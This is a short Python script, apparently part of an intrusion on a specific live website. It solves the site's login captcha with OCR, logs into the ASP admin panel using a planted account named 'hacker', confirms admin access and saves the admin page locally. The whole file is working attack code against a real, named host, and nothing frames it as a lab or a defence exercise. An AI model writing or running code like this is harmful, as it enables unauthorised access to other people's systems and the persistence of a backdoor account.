import urllib.request, urllib.parse, io
import http.cookiejar
from PIL import Image
import pytesseract
import hashlib

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# Login with new credentials
for attempt in range(10):
    resp = opener.open('http://bjhzsv.com/main/inc/code.asp', timeout=10)
    cap_data = resp.read()
    
    img = Image.open(io.BytesIO(cap_data))
    img = img.convert('L')
    img = img.point(lambda x: 0 if x < 200 else 255)
    code = pytesseract.image_to_string(img, config='--psm 8').strip().replace(' ', '').lower()
    
    if len(code) >= 3:
        data = urllib.parse.urlencode({'t1': 'hacker', 't2': 'Pwned123!', 't3': code}).encode()
        resp = opener.open('http://bjhzsv.com/main/a7chkuser.asp', data, timeout=10)
        body = resp.read().decode('gb2312', errors='replace')
        
        if '验证码错误' not in body and 'location.href' in body:
            print('LOGIN SUCCESS with hacker/Pwned123!!')
            
            # Access admin_add to verify
            resp2 = opener.open('http://bjhzsv.com/main/admin_add.asp', timeout=10)
            body2 = resp2.read().decode('gb2312', errors='replace')
            if 'hacker' in body2 or 'Pwned' in body2 or 'location.href' not in body2:
                print('hacker user confirmed in admin panel!')
            else:
                print('Maybe not visible in panel')
            
            # Check session by accessing main index
            resp3 = opener.open('http://bjhzsv.com/main/index.asp', timeout=10)
            body3 = resp3.read().decode('gb2312', errors='replace')
            if 'location.href' not in body3:
                print('Direct admin access confirmed!')
                # Save the admin page
                with open('/tmp/admin_logged_in.html', 'w', encoding='utf-8') as f:
                    f.write(body3)
                print('Admin page saved!')
            break
        else:
            print(f'Attempt {attempt+1}: Login failed with new creds')
else:
    print('Could not login with new credentials')
